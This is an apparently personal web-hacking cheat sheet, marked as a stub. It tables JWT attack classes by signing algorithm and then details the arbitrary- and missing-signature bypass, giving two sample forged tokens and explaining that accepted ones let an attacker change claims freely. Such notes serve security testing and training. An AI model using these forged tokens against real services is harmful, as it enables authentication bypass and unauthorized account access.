---
created: 2026-07-08
tags:
  - web_hacking
  - cheatsheet
status: stub
---
## JWT vulnerabilities

| Attack                                   | Algorithm                                                 |
| ---------------------------------------- | --------------------------------------------------------- |
| Arbitrary / missing signature            | Any `alg`                                                 |
| `none` algorithm attack                  | Any `alg` (forged `none`)                                 |
| Weak JWS secret                          | **Symmetric**: `HS256`, `HS384`, `HS512`                  |
| KID header injection (secret lookup)     | **Symmetric**: `HS256`, `HS384`, `HS512`                  |
| JWK header injection                     | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| JKU header injection                     | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| `x5u` / `x5c` header injection           | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| KID header injection (public key lookup) | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| Algorithm confusion (`RS256` → `HS256`)  | Originally asymmetric, forced to `HS256`.                 |
## Arbitrary or missing signature

- **Arbitrary signature**: replace the signature segment with an arbitrary string (`header.payload.ARBITRARY`).

```JS
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjB4dHIxZ2dlciIsImlhdCI6MzQ3NTk0Nzg3MjJ9.ARBITRARY
```

- **Empty signature**: omit the signature entirely, but preserve the trailing dot (`header.payload.`).

```JS
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjB4dHIxZ2dlciIsImlhdCI6MzQ3NTk0Nzg3MjJ9. // no signature at all
```

- If either returns the same authenticated response as a valid token, signature verification is broken; you can swap in any claims you like without touching anything else.